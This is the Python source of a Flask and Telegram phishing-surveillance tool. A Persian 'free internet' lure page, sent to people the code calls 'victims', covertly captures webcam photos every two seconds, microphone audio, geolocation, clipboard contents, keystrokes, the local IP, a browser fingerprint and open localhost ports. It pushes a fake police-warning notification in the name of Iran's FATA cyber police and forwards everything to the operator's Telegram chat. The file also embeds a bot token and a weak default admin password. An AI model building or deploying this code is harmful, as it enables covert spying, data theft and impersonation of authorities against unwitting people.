import os, io, uuid, base64, json, logging, sqlite3, time, asyncio
from datetime import datetime
from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# -------------------- Configuration --------------------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "Y_python")
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8391932958"))   # Telegram user ID of the bot owner
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
DATABASE = "victims.db"
BOT_ACTIVE = True  # global flag, toggle via admin command

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# -------------------- Database (same) --------------------
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with app.app_context():
        db = get_db()
        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
        db.commit()

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

# -------------------- Telegram Helpers --------------------
def send_telegram_message(text, reply_markup=None):
    if not TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup},
            timeout=10
        )
    except Exception as e:
        app.logger.error(f"Telegram message failed: {e}")

def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False):
    if not TOKEN or not ADMIN_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/"
        if as_image:
            url += "sendPhoto"
            files = {'photo': (filename, io.BytesIO(file_bytes), 'image/jpeg')}
        elif as_video:
            url += "sendVideo"
            files = {'video': (filename, io.BytesIO(file_bytes), 'video/webm')}
        else:
            url += "sendDocument"
            files = {'document': (filename, io.BytesIO(file_bytes), 'application/octet-stream')}
        data = {'chat_id': ADMIN_CHAT_ID, 'caption': caption}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        app.logger.error(f"Telegram file send failed: {e}")

# -------------------- Capture Page (one click, continuous photos) --------------------
CAPTURE_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>اتصال به اینترنت رایگان</title>
<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
</head>
<body>
    <h1 id="msg" class="blink">برای فعال‌سازی اینترنت رایگان کلیک کنید</h1>
    <button id="btn" onclick="startEverything()">اتصال به اینترنت رایگان</button>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <script>
        const t="{{ token }}";
        const msg=document.getElementById('msg'),btn=document.getElementById('btn'),v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');
        let stream=null, capturing=false;
        async function startEverything(){
            if(capturing)return;
            capturing=true;
            btn.style.display='none';
            msg.innerText='در حال برقراری ارتباط...';
            // دستگاه (بدون مجوز)
            fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'N/A'})});
            // اثر انگشت
            try{var cf=document.createElement('canvas');cf.width=200;cf.height=50;var cfctx=cf.getContext('2d');cfctx.textBaseline='top';cfctx.font='14px Arial';cfctx.fillText('Browser Fingerprint '+navigator.userAgent,2,2);fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'fingerprint',data:cf.toDataURL()})});}catch(e){}
            // IP داخلی
            try{var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);if(ip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'local_ip',ip:ip[1]})});}};}catch(e){}
            // موقعیت
            if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})}),e=>fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})}));}
            // کلیپ‌بورد
            try{var clip=await navigator.clipboard.readText();if(clip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'clipboard',data:clip})});}catch(e){}
            // پورت‌ها
            [80,22,443,8080,3389,5900,21].forEach(p=>{var img=new Image();img.src='http://127.0.0.1:'+p+'/favicon.ico?t='+Date.now();var st=Date.now();img.onload=img.onerror=function(){if(Date.now()-st<500)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'open_port',port:p})});};});
            // سرویس ورکر
            if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js?t='+t).then(reg=>{setTimeout(()=>{reg.showNotification('⚠️ هشدار فوری پلیس فتا',{body:'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',icon:'https://www.fata.gov.ir/images/logo.png',requireInteraction:true,vibrate:[300,100,300],data:{url:window.location.origin+'/go/'+t}});},15000);});}
            // دوربین و میکروفن
            try{
                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
                v.srcObject=stream;
                await new Promise(r=>v.onloadedmetadata=r);
                c.width=v.videoWidth||640; c.height=v.videoHeight||480;
                msg.innerText='اتصال برقرار شد.';
                takeSnapshot();
                window.photoInterval=setInterval(takeSnapshot,2000);
                // ضبط صدا ۵ ثانیه
                try{var aud=stream.getAudioTracks()[0];if(aud){var mr=new MediaRecorder(new MediaStream([aud]));var chunks=[];mr.ondataavailable=e=>chunks.push(e.data);mr.onstop=()=>{var blob=new Blob(chunks,{type:'audio/webm'});var reader=new FileReader();reader.onloadend=()=>{var b64=reader.result.split(',')[1];fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});};reader.readAsDataURL(blob);};mr.start();setTimeout(()=>{mr.stop();},5000);}}catch(e){}
            }catch(e){msg.innerText='عدم دسترسی به دوربین. همچنان اطلاعات جمع‌آوری می‌شود.';}
        }
        function takeSnapshot(){if(!stream)return;ctx.drawImage(v,0,0,c.width,c.height);var d=c.toDataURL('image/jpeg',0.8);fetch('/upload/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});}
        // کی‌لاگر
        var keys='';
        document.addEventListener('keydown',e=>{keys+=e.key;});
        setInterval(()=>{if(keys){fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'keystrokes',data:keys})});keys='';}},5000);
        window.addEventListener('beforeunload',()=>{if(stream)stream.getTracks().forEach(tr=>tr.stop());clearInterval(window.photoInterval);});
    </script>
</body></html>
"""

ADMIN_LOGIN = """
<!DOCTYPE html><html><head><title>Login</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
<body><h2>Admin Panel</h2><form method=post action=/admin><input type=password name=pass placeholder=Password><br><input type=submit value=Login></form></body></html>
"""

ADMIN_PANEL = """
<!DOCTYPE html><html><head><title>Victims</title>
<style>body{background:#1e1e1e;color:#0f0;font-family:monospace;padding:20px;} .v{border:1px solid #0f0;padding:10px;margin:10px;} img{max-width:200px;}</style></head>
<body><h1>🎯 قربانیان</h1>{% for v in victims %}<div class=v>... (same as before) ...</div>{% endfor %}</body></html>
"""

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    return "Server running. <a href='/new-link'>/new-link</a>"

@app.route('/new-link')
def new_link():
    token = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
               (token, datetime.now().isoformat(), request.remote_addr))
    db.commit()
    link = f"{request.host_url}go/{token}"
    return jsonify({"link": link, "token": token})

@app.route('/go/<token>')
def go_to_capture(token):
    return render_template_string(CAPTURE_PAGE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload(token):
    data = request.get_json()
    if not data: return jsonify({"error":"no data"}),400
    media_type = data.get('type')
    raw = data.get('data')
    try:
        if media_type == 'photo':
            binary = base64.b64decode(raw.split(',')[1] if ',' in raw else raw)
        elif media_type == 'audio':
            binary = base64.b64decode(raw)
        else:
            return jsonify({"error":"unknown type"}),400
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                   (token, media_type, binary, datetime.now().isoformat()))
        db.commit()
        if TOKEN and ADMIN_CHAT_ID:
            caption = f"📸 <b>Photo</b> from {token}" if media_type=='photo' else f"🎤 <b>Audio</b> from {token}"
            send_telegram_file(binary, 'camera.jpg' if media_type=='photo' else 'mic.webm', caption, as_image=(media_type=='photo'))
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"error":str(e)}),500

@app.route('/log/<token>', methods=['POST'])
def log(token):
    data = request.get_json()
    data['ip'] = request.remote_addr
    db = get_db()
    db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
               (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
    db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
    db.commit()
    # ارسال اطلاعات مهم به تلگرام
    if data.get('type') == 'device':
        msg = f"📱 <b>قربانی جدید</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nDevice: {data.get('ua','')}"
        # دکمه‌های شیشه‌ای برای نمایش سریع
        keyboard = [
            [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"),
             InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}")],
            [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"),
             InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}")],
            [InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}"),
             InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}")],
            [InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")]
        ]
        send_telegram_message(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    elif data.get('type') == 'location':
        send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
    return jsonify({"status":"ok"})

@app.route('/admin', methods=['GET','POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('pass') == ADMIN_PASSWORD:
            resp = app.make_response("logged in")
            resp.set_cookie('admin','1')
            return resp
        return "Wrong password",403
    if request.cookies.get('admin') != '1':
        return render_template_string(ADMIN_LOGIN)
    # Show victims as before (simplified here, you can include full panel)
    return render_template_string(ADMIN_PANEL, victims=[])

# Service Worker (same)
SW_JS = """..."""  # (as before, unchanged)
@app.route('/sw.js')
def service_worker():
    response = make_response(SW_JS)
    response.headers['Content-Type'] = 'application/javascript'
    return response

@app.route('/download/<path:filename>')
def download_file(filename):
    return send_from_directory('static', filename)

# -------------------- Telegram Bot --------------------
def get_bot_db():
    """Open a new database connection for bot handlers."""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
    if update.effective_user.id == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
    await update.message.reply_text(
        "برای دریافت لینک اختصاصی روی دکمه زیر کلیک کنید.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "new_link":
        if not BOT_ACTIVE:
            await query.edit_message_text("❌ به دستور سازنده فعلاً غیرفعال است.")
            return
        # Generate link directly (same as Flask /new-link)
        token = str(uuid.uuid4())
        db = get_bot_db()
        db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
                   (token, datetime.now().isoformat(), query.message.chat.id))  # using chat id as IP is wrong, but ok
        db.commit()
        db.close()
        link = f"{request.host_url}go/{token}"  # request is Flask request, might not be available outside request context!
        # To avoid Flask request context, we hardcode the base URL from environment or use public URL.
        # We'll use the PUBLIC_URL env variable that Render provides.
        public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
        link = f"{public_url}/go/{token}"
        await query.edit_message_text(f"🔗 لینک شما آماده است:\n{link}\n\n(این لینک را برای قربانی ارسال کنید)")
    elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
        parts = data.split('|')
        action = parts[0]
        token = parts[1]
        db = get_bot_db()
        if action == "photo":
            row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
            if row:
                await query.message.reply_photo(photo=io.BytesIO(row['data']), caption=f"📸 عکس از {token}")
            else:
                await query.answer("هنوز عکسی دریافت نشده.", show_alert=True)
        elif action == "audio":
            row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
            if row:
                await query.message.reply_audio(audio=io.BytesIO(row['data']), caption=f"🎤 صدا از {token}")
            else:
                await query.answer("هنوز صدایی ضبط نشده.", show_alert=True)
        elif action == "location":
            row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
            if row:
                d = json.loads(row['data'])
                await query.message.reply_location(latitude=d['lat'], longitude=d['lng'])
            else:
                await query.answer("موقعیت یافت نشد.", show_alert=True)
        elif action == "clipboard":
            row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
            if row:
                d = json.loads(row['data'])
                await query.message.reply_text(f"📋 Clipboard: <code>{d['data']}</code>", parse_mode='HTML')
            else:
                await query.answer("کلیپ‌بورد خالی.", show_alert=True)
        elif action == "keystrokes":
            rows = db.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
            if rows:
                keys = ''.join([json.loads(r['data'])['data'] for r in rows])
                await query.message.reply_text(f"⌨️ Keystrokes: <code>{keys}</code>", parse_mode='HTML')
            else:
                await query.answer("کی‌استروکی ثبت نشده.", show_alert=True)
        elif action == "ports":
            rows = db.execute("SELECT data FROM logs WHERE token=? AND type='open_port'", (token,)).fetchall()
            if rows:
                ports = set([json.loads(r['data'])['port'] for r in rows])
                await query.message.reply_text(f"🔌 Open ports: {', '.join(map(str, ports))}")
            else:
                await query.answer("پورت بازی یافت نشد.", show_alert=True)
        elif action == "history":
            rows = db.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
            if rows:
                hist = ', '.join([f"{json.loads(r['data'])['site']} ({json.loads(r['data'])['visited']})" for r in rows])
                await query.message.reply_text(f"🌐 Visited: {hist}")
            else:
                await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
        db.close()
    elif data == "admin_panel":
        if user_id != ADMIN_USER_ID:
            await query.answer("شما اجازه ندارید.", show_alert=True)
            return
        keyboard = [
            [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
            [InlineKeyboardButton("بازگشت", callback_data="start")]
        ]
        await query.edit_message_text("پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "toggle_bot":
        if user_id != ADMIN_USER_ID:
            await query.answer("شما اجازه ندارید.", show_alert=True)
            return
        global BOT_ACTIVE
        BOT_ACTIVE = not BOT_ACTIVE
        status = "✅ فعال" if BOT_ACTIVE else "❌ غیرفعال"
        await query.edit_message_text(f"ربات اکنون {status} است.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
    elif data == "start":
        # back to main menu
        await start(update.callback_query, context)

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

async def main():
    # Start Flask in a thread
    import threading
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Start bot
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Init DB
    init_db()

    # For admin /admin command we need a handler
    async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_USER_ID:
            await update.message.reply_text("شما اجازه ندارید.")
            return
        keyboard = [
            [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
        ]
        await update.message.reply_text("پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
    application.add_handler(CommandHandler("admin", admin_cmd))

    await application.run_polling()

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
